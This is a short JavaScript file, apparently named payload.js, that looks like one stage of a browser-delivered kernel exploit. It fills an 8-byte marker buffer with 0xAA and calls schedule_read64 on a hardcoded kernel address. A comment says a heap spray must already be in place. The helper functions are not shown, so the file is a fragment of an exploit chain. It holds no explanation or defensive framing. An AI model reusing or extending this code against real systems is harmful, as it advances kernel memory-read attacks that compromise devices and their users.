window.read_target = new Uint8Array(8);

window.onload = () => {
  debug_log("✅ payload.js loaded!");

  // Fill marker
  for (let i = 0; i < 8; i++) read_target[i] = 0xAA;

  // Attempt kernel read (spray must be in place)
  schedule_read64(0xFFFFFFFF82600000);
};
